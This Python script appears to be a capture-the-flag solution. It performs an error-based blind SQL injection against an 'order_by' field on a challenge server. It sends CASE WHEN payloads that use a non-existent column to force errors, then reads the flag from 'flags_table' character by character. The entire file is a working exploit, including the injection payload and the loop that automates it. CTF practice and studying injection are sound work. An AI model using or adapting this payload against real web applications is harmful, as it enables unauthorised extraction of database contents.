import requests
import string

url = "http://challenges.alphabit.club:1345/sort"

flag = "Alphabit{"  # Start with known prefix to optimize
position = len(flag) + 1  # Start after the known prefix

# Characters expected in the flag (including symbols)
chars = string.ascii_letters + string.digits + "_!@#$%^&*()}-=+"

while True:
    found_char = False
    for char in chars:
        # Use non-existent column 'invalid_column' in ELSE to force error
        payload = f"(CASE WHEN (SELECT SUBSTR(flag,{position},1) FROM flags_table LIMIT 1) = '{char}' THEN UCL_WON ELSE invalid_column END)"
        data = {'order_by': payload}
        
        try:
            response = requests.post(url, data=data, timeout=5)
            # Check if response is a valid list (success) or error
            if response.status_code == 200:
                json_response = response.json()
                if isinstance(json_response, list):
                    flag += char
                    print(f"Found character at position {position}: {char} → Flag: {flag}")
                    found_char = True
                    position += 1
                    break  # Move to next character
        except:
            continue  # Handle exceptions (e.g., JSON decode errors)
    
    if not found_char:
        # Check if we've reached the end of the flag
        if flag.endswith('}'):
            print("Flag retrieval complete.")
            break
        else:
            print("No more characters found. Exiting.")
            break

print(f"Flag: {flag}")